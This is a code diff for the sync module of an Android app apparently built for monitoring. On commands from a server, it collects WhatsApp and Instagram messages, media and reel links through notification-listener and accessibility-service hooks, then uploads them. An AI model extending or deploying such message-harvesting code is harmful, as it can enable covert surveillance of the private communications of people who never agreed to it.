@@ -90,13 +90,18 @@ class SyncRunner(private val context: Context) {
         }
         commands.filter { it.command_type == "sync_whatsapp" }.forEach { command ->
             try {
-                com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
-                com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
+                val notifInst = com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance
+                val a11yInst = com.spapp.monitoring.blocking.BlockAccessibilityService.instance
+                notifInst?.processAllActiveNotifications()
+                a11yInst?.let { service ->
                     service.recordWhatsAppChatIfForeground(service.rootInActiveWindow)
                 }
-                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(context)
-                ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = "WhatsApp sync triggered"))
-            } catch (_: Exception) {}
+                val db = AppDatabase.getInstance(context)
+                syncWhatsAppMessages(bearer, db)
+                ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = "WhatsApp sync completed"))
+            } catch (e: Exception) {
+                ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = false, message = "Error: ${e.message}"))
+            }
         }
         commands.filter { it.command_type == "sync_instagram" }.forEach { command ->
             try {
@@ -394,8 +399,9 @@ class SyncRunner(private val context: Context) {
                     messageText = it.messageText,
                     isOutgoing = it.isOutgoing,
                     messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
-                    mediaType = it.mediaType ?: (if (it.mediaPath != null) "image" else null),
-                    mediaPath = it.mediaPath ?: latestMediaBase64
+                    mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
+                    mediaPath = it.mediaPath ?: latestMediaBase64,
+                    reelUrl = it.reelUrl
                 )
             }
 
@@ -899,8 +905,9 @@ class SyncRunner(private val context: Context) {
                 messageText = it.messageText,
                 isOutgoing = it.isOutgoing,
                 messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
-                mediaType = it.mediaType,
-                mediaPath = it.mediaPath
+                mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
+                mediaPath = it.mediaPath,
+                reelUrl = it.reelUrl
             )
         }
         try {
